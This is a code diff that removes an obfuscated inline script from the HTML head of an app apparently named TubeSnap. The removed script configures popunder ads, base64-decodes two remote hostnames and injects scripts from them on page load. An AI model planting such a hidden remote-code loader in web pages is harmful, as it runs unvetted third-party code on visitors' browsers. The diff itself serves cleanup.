@@ -24,55 +24,6 @@
       work correctly both with client-side routing and a non-root public URL.
       Learn how to configure a non-root public URL by running `npm run build`.
     -->
-    <script type="text/javascript" data-cfasync="false">
-      /*<![CDATA[/* */
-      (function () {
-        var r = window,
-          m = "e4b874e3c87891dce6f05205202fb689",
-          z = [
-            ["siteId", 167 - 835 - 429 + 5144391],
-            ["minBid", 0],
-            ["popundersPerIP", "0"],
-            ["delayBetween", 0],
-            ["default", false],
-            ["defaultPerDay", 0],
-            ["topmostLayer", "auto"],
-          ],
-          d = [
-            "d3d3LnZpc2FyaW9tZWRpYS5jb20vd2pwbGlzdC5jb3JlLm1pbi5jc3M=",
-            "ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvclYvZ2J1bmRsZS5taW4uanM=",
-          ],
-          k = -1,
-          y,
-          x,
-          g = function () {
-            clearTimeout(x);
-            k++;
-            if (d[k] && !(1755236848000 < new Date().getTime() && 1 < k)) {
-              y = r.document.createElement("script");
-              y.type = "text/javascript";
-              y.async = !0;
-              var i = r.document.getElementsByTagName("script")[0];
-              y.src = "https://" + atob(d[k]);
-              y.crossOrigin = "anonymous";
-              y.onerror = g;
-              y.onload = function () {
-                clearTimeout(x);
-                r[m.slice(0, 16) + m.slice(0, 16)] || g();
-              };
-              x = setTimeout(g, 5e3);
-              i.parentNode.insertBefore(y, i);
-            }
-          };
-        if (!r[m]) {
-          try {
-            Object.freeze((r[m] = z));
-          } catch (e) {}
-          g();
-        }
-      })();
-      /*]]>/* */
-    </script>
 
     <title>TubeSnap</title>
   </head>
